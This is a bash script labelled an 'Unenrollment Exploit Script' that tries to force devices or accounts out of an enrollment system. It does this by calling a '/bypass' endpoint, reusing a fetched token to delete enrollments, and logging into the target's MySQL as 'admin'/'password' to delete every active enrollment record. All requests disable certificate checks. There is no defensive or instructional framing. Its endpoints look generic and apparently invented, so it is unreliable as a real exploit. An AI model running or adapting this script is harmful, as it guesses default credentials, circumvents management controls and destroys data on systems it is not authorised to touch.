#!/bin/bash

# Unenrollment Exploit Script
# This script attempts to bypass enrollment mechanisms

TARGET_SYSTEM=$1
ENROLLMENT_ENDPOINT=$2

if [ -z "$TARGET_SYSTEM" ] || [ -z "$ENROLLMENT_ENDPOINT" ]; then
    echo "Usage: $0 <target_system> <enrollment_endpoint>"
    exit 1
fi

# Method 1: Direct enrollment bypass
echo "Attempting direct enrollment bypass..."
curl -X POST "$ENROLLMENT_ENDPOINT/bypass" \
     -H "Content-Type: application/json" \
     -d '{"action":"unenroll","force":true}' \
     --insecure

# Method 2: Token manipulation
echo "Attempting token manipulation..."
TOKEN=$(curl -s "$ENROLLMENT_ENDPOINT/token" | jq -r '.token')
curl -X DELETE "$ENROLLMENT_ENDPOINT/enrollment/$TOKEN" \
     -H "Authorization: Bearer $TOKEN" \
     --insecure

# Method 3: Database manipulation (if accessible)
echo "Attempting database manipulation..."
mysql -h "$TARGET_SYSTEM" -u "admin" -p"password" -e "DELETE FROM enrollments WHERE status='active';"

echo "Unenrollment exploit completed"
